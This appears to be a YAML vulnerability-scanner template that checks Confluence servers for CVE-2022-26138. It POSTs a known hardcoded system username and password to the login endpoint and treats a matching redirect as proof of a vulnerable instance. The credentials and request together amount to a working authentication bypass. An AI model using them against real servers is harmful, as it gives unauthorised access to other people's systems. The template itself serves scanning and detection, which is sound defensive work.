name: poc-yaml-confluence-cve-2022-26138
binding: 8cbb3704-d1b6-46ce-a5dd-6e77b3c77ff1
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://github.com/alcaparra/CVE-2022-26138
    vulnerability:
        id: CT-458955
        level: critical
transport: http
set:
    rand: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /dologin.action
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: os_username=disabledsystemuser&os_password=disabled1system1user6708&login=Log+in&os_destination=%2F{{rand}}.action
        expression: |
            response.status == 302 && ("^" + request.url.scheme + "://" + request.url.host + "/" + rand + ".action$").matches(response.headers["Location"])
expression: r0()
